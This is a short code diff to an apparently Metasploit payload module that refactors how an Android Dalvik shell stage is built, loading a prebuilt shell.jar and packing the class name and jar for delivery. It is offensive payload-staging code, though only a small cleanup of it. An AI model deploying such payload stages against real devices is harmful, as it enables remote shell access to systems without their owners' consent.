@@ -34,16 +34,16 @@ module Metasploit3
 	end
 
 	#
-	# Override the Payload::Dalvik version so we can load a prebuilt jar to be
-	# used as the final stage
+	# Override the {Payload::Dalvik} version so we can load a prebuilt jar
+	# to be used as the final stage
 	#
 	def generate_stage
 		clazz = 'androidpayload.stage.Shell'
 		file = File.join(Msf::Config.data_directory, "android", "shell.jar")
-		met = File.open(file, "rb") {|f| f.read(f.stat.size) }
+		shell_jar = File.open(file, "rb") {|f| f.read(f.stat.size) }
 
-		# All of the dendencies to create a dalvik loader, followed by the length of the classname to load,
-		# followed by the classname, followed by the length of the jar and the jar itself.
-		[clazz.length].pack("N") + clazz + [met.length].pack("N") + met
+		# Name of the class to load from the stage, and then the actual jar
+		# to load it from
+		java_string(clazz) + java_string(shell_jar)
 	end
 end
